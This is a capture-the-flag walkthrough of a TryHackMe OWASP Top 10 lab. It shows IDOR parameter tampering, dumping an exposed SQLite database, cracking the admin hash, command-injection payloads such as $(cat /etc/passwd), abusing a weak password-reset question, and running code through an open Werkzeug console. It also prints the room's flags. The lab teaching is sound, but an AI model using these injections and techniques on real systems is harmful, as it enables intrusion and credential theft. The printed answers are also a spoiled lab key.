# TryHackMe: OWASP Walkthrough

Room URL: https://tryhackme.com/room/owasptop102021

---

# 1. Broken Access Control (IDOR Challenge)

**Q1. Look at other users' notes. What is the flag?**

- Change the `id` parameter till we get the flag
- `http://10.10.203.85/note.php?note_id=5`
- ![image](https://github.com/user-attachments/assets/825411d8-d060-4a86-9e45-18cb465b8f5c)
- in `id=5` it says try id number lower than 1 
- `http://10.10.203.85/note.php?note_id=0`
- ![image](https://github.com/user-attachments/assets/2fb6f7b5-f56c-4b86-88d3-fdf9e323f4f2)

Ans: ***flag{fivefourthree}***

---
# 2.Cryptographic Failures (Challenge)

**Q1. What is the name of the mentioned directory?**

- look into the source page of the login page
- ![image](https://github.com/user-attachments/assets/ed01d151-880c-4a36-af08-248a1160dd76)


Ans: ***/assets***

---
**Q2.Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?**

- go to the mentioned directory
-![image](https://github.com/user-attachments/assets/c1553b5a-9f25-4f72-b8fd-9041a8b65093)
- click on the webapp.db 
- ![image](https://github.com/user-attachments/assets/f4874008-f8a3-4ab4-bce3-26c9a1a85ae3)

Ans: ***webapp.db***

---
**Q3.Use the supporting material to access the sensitive data. What is the password hash of the admin user?**

- Download the database using this command `wget http://10.10.226.253:81/assets/webapp.db `
- ![image](https://github.com/user-attachments/assets/9b918958-f546-4860-a8a4-4cd0b9d3bd87)
- Then access the database using this command `sqlite3 webapp.db`
- show tables use, `.tables`
- To see table info use, `PRAGMA table_info(<table_name>);`
- To dump all info stored in that table, use this command. `SELECT * FROM <table_name>;`
- ![image](https://github.com/user-attachments/assets/54cef7d1-fcd9-4351-a484-241764dc2639)


`4413096d9c933359b898b6202288a650|admin|6eea9b7ef19179a06954edd0f6c05ceb|1`

- userID: `4413096d9c933359b898b6202288a650`
- username: `admin`
- password: `6eea9b7ef19179a06954edd0f6c05ceb`
- admin: `1`

Ans: ***6eea9b7ef19179a06954edd0f6c05ceb***

---
**Q4.Crack the hash. What is the admin's plaintext password?**
- Use https://crackstation.net/ website to crack the admin hash
- ![image](https://github.com/user-attachments/assets/696399ef-376d-44ae-b91d-141bf35faa06)

Ans: ***qwertyuiop***

---
**Q5.Log in as the admin. What is the flag?**

- Use the credentials found to login and get the flag
- ![image](https://github.com/user-attachments/assets/990867a1-3060-4b06-9521-69417b8f4209)

Ans: ***THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}***

---
# 3.Command Injection

**Q1. What strange text file is in the website's root directory?**

- type `$(ls)` to list files in the current directory
- ![image](https://github.com/user-attachments/assets/1562926f-b8bd-4bbf-8106-63556115b3f2)

Ans: ***drpepper.txt***

---
**Q2. How many non-root/non-service/non-daemon users are there?**

- type `$(cut -d: -f1,3  /etc/passwd )` to print `passwd` file and only show username and its id. or simply list home directory `ls /home`
- ![image](https://github.com/user-attachments/assets/81d5823d-fff3-4163-8601-fe47c9b1f475)

- `0 `-> root
- `1-99 or 1-99` -> system/services users
- `1000 and above `-> requler human users

- There are no regular human users. As for the user with the `id 65534` is a special one, acts as a fallback when a user is missing or unknown.

Ans: ***0***

---
**Q3. What user is this app running as?**
- type `$(whoami)` to print the current username of the user login
- ![image](https://github.com/user-attachments/assets/af8d0719-9740-4f30-a5f0-2fbf74c3c840)

Ans: ***apache***

---
**Q4. What is the user's shell set as?**

- type `$(cat /etc/passwd) `
- ![image](https://github.com/user-attachments/assets/15c72a87-096d-4aae-844f-9263c03ebc54)
- `username:x:UID:GID:comment:home:shell`

Ans: ***/sbin/nologin***

---
**Q5. What version of Alpine Linux is running?**

- type `$(cat /etc/alpine-release)` to check for Alpine version
- ![image](https://github.com/user-attachments/assets/dbc4d7eb-992f-4e17-a2a3-a7c63682ba1d)

Ans: ***3.16.0***

---
# 4. Insecure Design

**Q1. What is the value of the flag in joseph's account?**

- Try to reset joseph's password. Keep in mind the method used by the site to validate if you are indeed joseph.
- go to the login page and select I foreget my password option, set the username as `joseph` then use the simple security check to guess which is "What's your favourite colour?" the answer is `green`
- ![image](https://github.com/user-attachments/assets/a7a6d8b0-d9f3-4057-affd-12a18e0f02b4)
- Take the new password and login to joseph account
- ![image](https://github.com/user-attachments/assets/a2d8ee20-0295-40b0-a94d-6a892acc4c6d)
- ![image](https://github.com/user-attachments/assets/2033c17d-eaaa-4d0e-bca5-9d17e0f47a7e)


Ans: ***THM{Not_3ven_c4tz_c0uld_sav3_U!}***

---
# 5. Security Misconfiguration

**Q1. Navigate to http://10.10.112.172:86/console to access the Werkzeug console.**

- ![image](https://github.com/user-attachments/assets/a83ae07c-252c-4ac2-be63-55cdf764213b)

---
**Q2. Use the Werkzeug console to run the following Python code to execute the ls -l command on the server:**

`import os; print(os.popen("ls -l").read())`

**What is the database file name (the one with the .db extension) in the current directory?**

- ![image](https://github.com/user-attachments/assets/7a19cbd0-f307-4832-a2f5-493878d33a4c)

Ans: ***todo.db***

---
**Q3. Modify the code to read the contents of the `app.py` file, which contains the application's source code. What is the value of the `secret_flag` variable in the source code?**

- `import os; print(os.popen("cat app.py").read())`

Ans: ***THM{Just_a_tiny_misconfiguration}***

